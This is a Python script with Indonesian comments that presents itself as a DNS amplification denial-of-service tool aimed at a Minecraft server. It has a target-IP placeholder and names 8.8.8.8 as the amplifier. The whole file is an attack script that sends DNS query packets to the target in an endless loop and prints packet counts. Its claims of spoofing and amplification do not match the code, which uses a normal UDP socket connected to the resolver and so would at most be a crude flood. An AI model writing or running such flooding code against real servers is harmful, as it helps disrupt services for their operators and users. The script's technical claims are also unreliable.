import socket
import random
import struct
import time

# IP target server
target_ip = "TARGET_IP_HERE"
target_port = 25565  # Minecraft server default port

# Server DNS yang digunakan untuk amplifikasi (Harus open resolver)
dns_server = "8.8.8.8"

# Membuat permintaan DNS yang dipalsukan
def create_dns_request():
    packet_id = random.randint(0, 65535)
    flags = 0x0100  # Permintaan standar
    qd_count = 1    # Satu pertanyaan
    an_count = 0    # Tidak ada jawaban
    ns_count = 0    # Tidak ada otoritas
    ar_count = 0    # Tidak ada tambahan

    query_name = b'\x03www\x06google\x03com\x00'  # Contoh query
    query_type = 1  # Type A
    query_class = 1  # IN

    dns_header = struct.pack(">HHHHHH", packet_id, flags, qd_count, an_count, ns_count, ar_count)
    dns_question = query_name + struct.pack(">HH", query_type, query_class)
    
    return dns_header + dns_question

# Mengirimkan permintaan DNS yang dipalsukan ke server DNS untuk amplifikasi
def send_dns_amplification():
    sent_packets = 0
    total_data_sent = 0
    start_time = time.time()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((dns_server, 53))

        # Looping untuk mengirimkan paket terus-menerus
        while True:
            dns_request = create_dns_request()
            s.sendto(dns_request, (target_ip, target_port))
            sent_packets += 1
            total_data_sent += len(dns_request)
            print(f"Packet sent to {target_ip}:{target_port}, Packet ID: {struct.unpack('>H', dns_request[:2])[0]}")

            # Setiap 1000 paket, cetak statistik
            if sent_packets % 1000 == 0:
                elapsed_time = time.time() - start_time
                print(f"Packets sent: {sent_packets}, Total data sent: {total_data_sent} bytes, Time elapsed: {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    send_dns_amplification()
